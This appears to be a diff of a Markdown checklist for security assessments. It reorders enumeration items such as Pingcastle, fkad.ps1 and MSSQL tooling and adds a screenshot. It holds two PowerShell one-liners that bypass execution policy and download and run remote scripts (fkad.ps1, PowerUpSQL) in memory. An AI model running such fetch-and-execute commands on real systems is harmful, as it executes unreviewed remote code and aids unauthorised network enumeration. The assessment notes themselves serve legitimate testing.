@@ -30,11 +30,13 @@ Example:
 
 For most assessments it makes sense to follow up enumeration on a provided device. This includes, but is not limited to:
 
-- [ ] Pingcastle
 - [ ] fkad.ps1
 ```ps
 powershell -ep bypass -c "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/fkxdr/fkad/refs/heads/main/fkad.ps1')"
 ```
+<img width="1239" height="728" alt="image" src="https://github.com/user-attachments/assets/7f62cd13-e9ea-4f95-a0fa-01e70296caf6" />
+
+- [ ] Pingcastle
 - [ ] MSSQL
 ```powershell
 IEX (iwr 'https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1')
